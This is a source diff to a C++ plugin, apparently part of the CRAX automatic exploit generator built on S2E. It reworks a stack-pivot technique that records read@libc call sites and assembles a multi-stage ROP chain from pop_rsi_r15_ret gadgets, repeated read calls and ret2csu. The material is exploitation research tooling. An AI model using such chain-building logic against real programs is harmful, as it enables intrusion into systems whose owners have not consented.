@@ -19,10 +19,12 @@
 // SOFTWARE.
 
 #include <s2e/Plugins/CRAX/CRAX.h>
+#include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>
 #include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
 #include <s2e/Plugins/CRAX/Utils/StringUtil.h>
 
 #include <cassert>
+#include <memory>
 
 #include "StackPivot.h"
 
@@ -33,11 +35,15 @@ namespace s2e::plugins::crax {
 using SymbolicRopPayload = Technique::SymbolicRopPayload;
 using ConcreteRopPayload = Technique::ConcreteRopPayload;
 
-
-BasicStackPivot::BasicStackPivot(CRAX &ctx) : StackPivot(ctx) {
+BasicStackPivot::BasicStackPivot(CRAX &ctx)
+    : StackPivot(ctx) {
     resolveRequiredGadgets();
 }
 
+
+void BasicStackPivot::initialize() {
+
+}
 
 bool BasicStackPivot::checkRequirements() const {
     // XXX: check if ROP gadgets exist.
@@ -98,15 +104,27 @@ std::string BasicStackPivot::toString() const {
 
 
 
-AdvancedStackPivot::AdvancedStackPivot(CRAX &ctx) : StackPivot(ctx) {
+AdvancedStackPivot::AdvancedStackPivot(CRAX &ctx)
+    : StackPivot(ctx),
+      m_offsetToRetAddr(),
+      m_readCallSites() {
     resolveRequiredGadgets();
+
+    ctx.beforeInstructionHooks.connect(
+            sigc::mem_fun(*this, &AdvancedStackPivot::maybeInterceptReadCallSites));
+
+    ctx.beforeExploitGenerationHooks.connect(
+            sigc::mem_fun(*this, &AdvancedStackPivot::beforeExploitGeneration));
 }
 
 
+void AdvancedStackPivot::initialize() {
+
+}
+
 bool AdvancedStackPivot::checkRequirements() const {
     const auto &sym = m_ctx.getExploit().getElf().symbols();
-    return sym.find("read") != sym.end() &&
-           m_ctx.getWritePrimitives().size() > 0;
+    return sym.find("read") != sym.end() && m_readCallSites.size();
 }
 
 void AdvancedStackPivot::resolveRequiredGadgets() {
@@ -122,74 +140,84 @@ std::string AdvancedStackPivot::getAuxiliaryFunctions() const {
 }
 
 std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() const {
-    /*
-    const std::vector<uint64_t> &writePrimitives = m_ctx.getWritePrimitives();
-    assert(writePrimitives.size());
+    assert(m_readCallSites.size() &&
+           "AdvancedStackPivot requires at least one call site of read@libc");
 
-    // Resolve `ret2LeaRbp`.
+    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
+    assert(ret2csu && "Ret2csu object not found");
+
+    // Resolve ret2LeaRbp.
     // XXX: from balsn: this is a good research topic.
-    uint64_t ret2LeaRbp = writePrimitives.front() - determineOffset();
-    m_ctx.getExploit().registerSymbol("ret2lea_rbp", ret2LeaRbp);
+    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
+    uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address);
 
-    std::vector<SymbolicRopPayload> ret = {
-        {
-            BaseOffsetExpr::create(m_ctx.getExploit(), "pivot_dest");
-            BaseOffsetExpr::create(m_ctx.getExploit(), "ret2lea_rbp");
-        }, {
-            format("b'A' * %d", m_ctx.m_padding),
-            format("p64(pivot_dest + 8 + %d)", m_ctx.m_padding),
-            format("p64(0x%x)", ret2LeaRbp)
-        }, {
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 1)  # rsi",
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret",
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 2)  # rsi"
-        }, {
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret",
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 3)  # rsi",
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret"
-        }, {
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 4)  # rsi",
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret",
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 5)  # rsi"
-        }, {
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret",
-            "p64(pop_rsi_r15_ret)            # ret",
-            "p64(pivot_dest + 8 + 0x30 * 6)  # rsi",
-            "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret",
-        }
+    // Return to a previous call site of read@libc.
+    SymbolicRopPayload part1 = {
+        ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))};
+
+    // Generate the payload which guides the weird machine back to the exploitable state.
+    SymbolicRopPayload part2 = {
+        ByteVectorExpr::create(std::vector<uint8_t>(m_offsetToRetAddr, 'A')),
+        AddExpr::alloc(
+                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                AddExpr::alloc(
+                        ConstantExpr::create(8, Expr::Int64),
+                        ConstantExpr::create(m_offsetToRetAddr, Expr::Int64))),
+        BaseOffsetExpr::create(m_ctx.getExploit(), "", std::to_string(ret2LeaRbp))
     };
 
-    Ret2csu *ret2csu = dynamic_cast<Ret2csu*>(Technique::mapper["Ret2csu"]);
+    // At this point, a stack-buffer overflow should take place inside libc,
+    // and the weird machine shall not return from read@libc. Now we will
+    // be able to perform ROP, but we don't have enough space to perform
+    // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
+    // which continuously calls read@plt until there's enough space to perform
+    // ret2csu once.
+    SymbolicRopPayload part3;
+    for (size_t i = 0; i < 6; i++) {
+        ref<Expr> e0 = BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rsi_r15_ret");
+        ref<Expr> e1 = AddExpr::alloc(
+                BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                AddExpr::alloc(
+                        ConstantExpr::create(8, Expr::Int64),
+                        MulExpr::alloc(
+                                ConstantExpr::create(0x30, Expr::Int64),
+                                ConstantExpr::create(i + 1, Expr::Int64))));
+        ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
+        ref<Expr> e3 = BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read");
 
-    if (!ret2csu) {
-        log<WARN>() << "StackPivot: unable to get ret2csu technique!\n";
-    } else {
-        std::vector<std::vector<std::string>> r = ret2csu->getRopPayloadList(
-            "0",
-            "pivot_dest + 8 + 0x30 * 7 - 8",
-            "0x400",
-            "elf.sym['read']"
-        );
-
-        ret.push_back(std::vector<std::string>(r[0].begin(), r[0].begin() + 6));
-        ret.push_back(std::vector<std::string>(r[0].begin() + 6, r[0].begin() + 12));
-        ret.push_back(std::vector<std::string>(r[0].begin() + 12, r[0].end()));
+        part3.push_back(e0);
+        part3.push_back(e1);
+        part3.push_back(e2);
+        part3.push_back(e3);
     }
 
+    // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
+    // read(0, pivot_dest + 0x30 * 7, 0x400).
+    SymbolicRopPayload part4 = ret2csu->getSymbolicRopPayloadList(
+            BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
+            ConstantExpr::create(0, Expr::Int64),
+            AddExpr::alloc(
+                    BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
+                    MulExpr::alloc(
+                            ConstantExpr::create(0x30, Expr::Int64),
+                            ConstantExpr::create(7, Expr::Int64))),
+            ConstantExpr::create(0x400, Expr::Int64))[0];
+
+    while (part4.size() % 6) {
+        part4.push_back(ConstantExpr::create(0, Expr::Int64));
+    }
+
+
+    std::vector<SymbolicRopPayload> ret = {part1, part2};
+    for (size_t i = 0; i < part3.size(); i += 6) {
+        ret.push_back(SymbolicRopPayload(part3.begin() + i, part3.begin() + i + 6));
+    }
+    for (size_t i = 0; i < part4.size(); i += 6) {
+        ret.push_back(SymbolicRopPayload(part4.begin() + i, part4.begin() + i + 6));
+    }
     return ret;
-    */
-    return {};
 }
 
 ConcreteRopPayload AdvancedStackPivot::getExtraPayload() const {
@@ -200,23 +228,36 @@ std::string AdvancedStackPivot::toString() const {
     return "AdvancedStackPivot";
 }
 
-uint64_t AdvancedStackPivot::determineOffset() const {
-    uint64_t target = m_ctx.getWritePrimitives()[0];
-    std::string symbol = m_ctx.getBelongingSymbol(target);
-    log<WARN>() << hexval(target) << " is within " << symbol << "\n";
+void AdvancedStackPivot::maybeInterceptReadCallSites(S2EExecutionState *state,
+                                                     const Instruction &i) {
+    if (m_ctx.isCallSiteOf(i.address, "read")) {
+        uint64_t buf = m_ctx.reg().readConcrete(Register::X64::RSI);
+        uint64_t len = m_ctx.reg().readConcrete(Register::X64::RDX);
+        m_readCallSites.insert({i.address, buf, len});
+    }
+}
+
+void AdvancedStackPivot::beforeExploitGeneration() {
+    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
+    uint64_t rsp = m_ctx.reg().readConcrete(Register::X64::RSP);
+    m_offsetToRetAddr = rsp - readCallSiteInfo.buf - 16;
+}
+
+uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr) const {
+    std::string symbol = m_ctx.getBelongingSymbol(readCallSiteAddr);
+    log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "\n";
 
     std::vector<Instruction> insns = m_ctx.getDisassembler().disasm(symbol);
-    uint64_t offset = 0;
+    uint64_t ret = 0;
 
     for (int i = insns.size() - 2; i >= 0; i--) {
         if (insns[i].opStr.find("rbp") != std::string::npos) {
-            offset = target - insns[i].address;
+            ret = insns[i].address;
             break;
         }
     }
-
-    assert(offset);
-    return offset;
+    assert(ret && "determineReturnAddr(): no suitable candidates?");
+    return ret - m_ctx.getExploit().getElf().getBase();
 }
 
 }  // namespace s2e::plugins::crax
